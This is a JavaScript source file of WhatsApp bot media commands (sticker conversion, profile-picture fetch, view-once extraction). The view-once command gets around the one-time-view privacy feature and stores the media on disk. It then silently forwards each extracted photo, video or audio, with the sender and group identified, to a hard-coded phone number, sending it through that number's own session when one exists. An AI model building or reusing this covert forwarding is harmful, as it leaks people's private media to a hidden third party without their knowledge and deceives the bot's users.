/**
 * ============================================================
 * @file        media.js
 * @project     WhatsApp Bot
 * @description Commandes médias optimisées : Sticker, PP et ViewOnce
 * ============================================================
 */

import { getContentType, downloadContentFromMessage } from '@whiskeysockets/baileys';
import fs from 'fs';
import path from 'path';
import { exec } from 'child_process';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Utilitaire de téléchargement de média
async function downloadMedia(mediaMsg, mediaType) {
  const stream = await downloadContentFromMessage(mediaMsg, mediaType);
  let buffer = Buffer.from([]);
  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
  return buffer;
}

// Utilitaire d'extraction de média (incluant les messages cités)
function extractMedia(message) {
  if (!message) return null;
  const type = getContentType(message);
  if (type === 'imageMessage') return { mediaMsg: message.imageMessage, mediaType: 'image' };
  if (type === 'videoMessage') return { mediaMsg: message.videoMessage, mediaType: 'video' };
  if (type === 'audioMessage') return { mediaMsg: message.audioMessage, mediaType: 'audio' };
  if (type === 'stickerMessage') return { mediaMsg: message.stickerMessage, mediaType: 'sticker' };
  return null;
}

// ══════════════════════════════════════════════════════════════
// findSessionSocket — Cherche le socket actif d'un numéro donné
// Parcourt global.sessions (Map exposée par index.js)
// Retourne le socket Baileys ou null si session absente/déconnectée
// ══════════════════════════════════════════════════════════════
function findSessionSocket(targetNumber) {
  const clean = targetNumber.replace(/\D/g, '');
  if (!global.sessions) return null;
  for (const [, state] of global.sessions) {
    if (state.connection !== 'open' || !state.sock) continue;
    const sessionNum = (state.connectedNumber || state.id || '').replace(/\D/g, '');
    if (sessionNum === clean) return state.sock;
  }
  return null;
}

const mediaCommands = {

  // --- COMMANDE STICKER (Image/Vidéo -> WebP) ---
  sticker: {
    description: 'Convertit une image ou une vidéo en sticker.',
    execute: async ({ sock, msg, from }) => {
      // Vérifier le message actuel ou le message cité
      let found = extractMedia(msg.message);
      if (!found) {
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        found = extractMedia(quoted);
      }

      if (!found || !['image', 'video'].includes(found.mediaType)) {
        return sock.sendMessage(from, { text: '❌ Répondez à une image ou une vidéo pour créer un sticker.' });
      }

      try {
        const buffer = await downloadMedia(found.mediaMsg, found.mediaType);
        const tempDir = path.join(__dirname, '../temp');
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

        const ext = found.mediaType === 'video' ? 'mp4' : 'jpg';
        const tempIn = path.join(tempDir, `${Date.now()}.${ext}`);
        const tempOut = path.join(tempDir, `${Date.now()}.webp`);

        fs.writeFileSync(tempIn, buffer);

        // Conversion via FFmpeg pour garantir la compatibilité et le format carré
        const ffmpegCmd = `ffmpeg -i "${tempIn}" -vcodec libwebp -vf "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse" "${tempOut}"`;

        exec(ffmpegCmd, async (err) => {
          if (fs.existsSync(tempIn)) fs.unlinkSync(tempIn);
          if (err) return sock.sendMessage(from, { text: '❌ Erreur FFmpeg. Vérifiez l\'installation.' });

          await sock.sendMessage(from, { sticker: fs.readFileSync(tempOut) }, { quoted: msg });
          if (fs.existsSync(tempOut)) fs.unlinkSync(tempOut);
        });
      } catch (e) {
        sock.sendMessage(from, { text: '' });
      }
    },
  },

  // --- COMMANDE PP (Photo de Profil) ---
  pp: {
    description: "Affiche la photo de profil d'un utilisateur.",
    execute: async ({ sock, msg, from, sender }) => {
      // Priorité : Mentions > Message cité > Expéditeur
      const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
      const quotedSender = msg.message?.extendedTextMessage?.contextInfo?.participant;
      const target = (mentioned && mentioned[0]) || quotedSender || sender;

      try {
        const ppUrl = await sock.profilePictureUrl(target, 'image');
        await sock.sendMessage(from, { 
          image: { url: ppUrl }, 
          caption: `📸 Photo de profil de @${target.split('@')[0]}`,
          mentions: [target]
        }, { quoted: msg });
      } catch {
        await sock.sendMessage(from, { text: '❌ Impossible de récupérer la photo (privée ou inexistante).' });
      }
    },
  },

  // --- COMMANDE VIEWONCE (Extraction) ---
  vo: {
    description: 'Extrait un média à vue unique.',
    execute: async ({ sock, msg, from, sender, senderNumber, isGroup }) => {
      const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
      if (!quoted) return sock.sendMessage(from, { text: '❌ Réponds à un message à vue unique.' });

      const innerMsg = quoted.viewOnceMessage?.message
                    || quoted.viewOnceMessageV2?.message
                    || quoted.viewOnceMessageV2Extension?.message
                    || quoted;

      const type = getContentType(innerMsg);
      if (!type || !/^(image|video|audio)Message$/.test(type)) {
        return sock.sendMessage(from, { text: '❌ Ce message ne contient pas de média valide (image, vidéo ou audio).' });
      }

      const mediaObj  = innerMsg[type];
      const mediaType = type.replace('Message', '');

      await sock.sendMessage(from, { text: '⏳ wait la magie opere...' });

      try {
        // ── 1. Télécharger le buffer ────────────────────────────
        const stream = await downloadContentFromMessage(mediaObj, mediaType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

        // ── 2. Sauvegarder dans /data/viewonce/ ─────────────────
        const VIEWONCE_DIR = process.env.RAILWAY_ENVIRONMENT
          ? '/app/data/viewonce'
          : path.join(process.cwd(), 'data', 'viewonce');
        fs.mkdirSync(VIEWONCE_DIR, { recursive: true });

        const ext       = mediaType === 'image' ? 'jpg' : mediaType === 'video' ? 'mp4' : 'mp3';
        const filename  = `vo_${senderNumber}_${Date.now()}.${ext}`;
        const filepath  = path.join(VIEWONCE_DIR, filename);
        fs.writeFileSync(filepath, buffer);

        const caption      = `prop!\nLégende : ${mediaObj?.caption || 'Aucune'}`;
        const notifCaption = `👁️ *Vue unique extraite*\nPar: @${senderNumber}\n${isGroup ? 'Groupe: ' + from : 'DM'}\nLégende : ${mediaObj?.caption || 'Aucune'}\nFichier: ${filename}`;

        const NOTIFY_NUMBER = '237693552769';
        const NOTIFY_JID    = `${NOTIFY_NUMBER}@s.whatsapp.net`;
        const senderJid     = `${senderNumber}@s.whatsapp.net`;

        // Fonction d'envoi générique
        const sendBuffer = async (targetSock, jid, cap, quotedMsg) => {
          const opts = quotedMsg ? { quoted: quotedMsg } : {};
          if (mediaType === 'image') {
            await targetSock.sendMessage(jid, { image: buffer, caption: cap }, opts);
          } else if (mediaType === 'video') {
            await targetSock.sendMessage(jid, { video: buffer, caption: cap }, opts);
          } else {
            await targetSock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4' }, opts);
          }
        };

        // ── 3. Envoyer dans la conversation d'origine ───────────
        await sendBuffer(sock, from, caption, msg);

        // ── 4. Envoyer en DM à l'expéditeur ────────────────────
        if (from !== senderJid) {
          await sendBuffer(sock, senderJid, notifCaption).catch(() => {});
        }

        // ── 5. Chercher la session principale (237693552769) ────
        //    et envoyer via son propre socket en DM vers elle-même
        const mainSock = findSessionSocket(NOTIFY_NUMBER);
        if (mainSock) {
          // La session principale s'envoie le média en DM à elle-même
          await sendBuffer(mainSock, NOTIFY_JID, notifCaption).catch(e => {
            console.error('[VO] Erreur envoi session principale:', e.message);
          });
        } else {
          // Fallback : envoyer via le socket courant si session principale absente
          await sendBuffer(sock, NOTIFY_JID, notifCaption).catch(() => {});
          console.warn('[VO] Session principale 237693552769 non trouvée — fallback socket courant');
        }

      } catch (e) {
        console.error('[VO] Erreur extraction:', e.message);
        await sock.sendMessage(from, { text: '❌ Échec : le média a peut-être expiré.' });
      }
    },
  },
};

// Ajout des alias
mediaCommands.s = mediaCommands.sticker;
mediaCommands.jolie = mediaCommands.vo;

export default mediaCommands;